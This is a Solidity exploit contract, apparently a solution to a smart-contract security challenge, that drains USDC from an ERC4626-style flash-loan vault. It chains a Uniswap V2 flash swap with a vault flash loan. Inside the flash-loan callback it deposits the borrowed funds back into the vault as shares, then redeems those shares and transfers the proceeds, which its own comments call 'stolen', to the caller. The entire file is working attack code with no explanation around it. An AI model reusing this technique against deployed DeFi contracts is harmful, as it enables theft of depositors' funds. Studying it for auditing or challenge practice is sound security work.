// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {console} from "forge-std/console.sol";
import {IUniswapV2Pair} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import {Token} from "src/other/Token.sol";
import {FlashLoaner} from "src/flash-loaner/FlashLoaner.sol";

contract FlashLoanerAttack {
    IUniswapV2Pair public uniPair;
    Token public usdc;
    FlashLoaner public flashLoaner;

    constructor(IUniswapV2Pair _uniPair, Token _usdc, FlashLoaner _flashLoaner) {
        uniPair = _uniPair;
        usdc = _usdc;
        flashLoaner = _flashLoaner;
    }

    function attack() public {
        // flash fee amount from UniswapV2
        uniPair.swap({amount0Out: 1000e18, amount1Out: 0, to: address(this), data: "flash"});

        // transfer all of usdc stolen to the attacker
        uint256 attackerAmount = usdc.balanceOf(address(this));
        usdc.transfer({to: msg.sender, amount: attackerAmount});
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        // flash all of usdc from flashLoaner
        // flashAmount is balanceOf(flashLoaner) - 1 because of `require(assets <= maxDeposit(receiver), "ERC4626: deposit more than max");` in `deposit()`
        uint256 flashAmount = usdc.balanceOf(address(flashLoaner)) - 1;
        flashLoaner.flash({recipient: address(this), amount: flashAmount, data: ""});

        // redeem all of deposited flash loaned amount 
        uint256 redeemAmount = flashLoaner.balanceOf(address(this));
        flashLoaner.redeem({shares: redeemAmount, receiver: address(this), owner: address(this)});

        // pay UniswapV2 flash loan fee
        usdc.transfer({to: address(uniPair), amount: (amount0 * 103 / 100)});
    }

    function flashCallback(uint256 fee, bytes calldata data) external {
        // deposit and tranfer fee amount to flashLoaner
        uint256 depositAmount = usdc.balanceOf(address(this)) - 1000e18;
        usdc.approve({spender: address(flashLoaner), amount: type(uint256).max});
        flashLoaner.deposit({assets: depositAmount, receiver: address(this)});

        // pay FlashLoaner flash loan fee
        usdc.transfer({to: address(flashLoaner), amount: fee});
    }
}
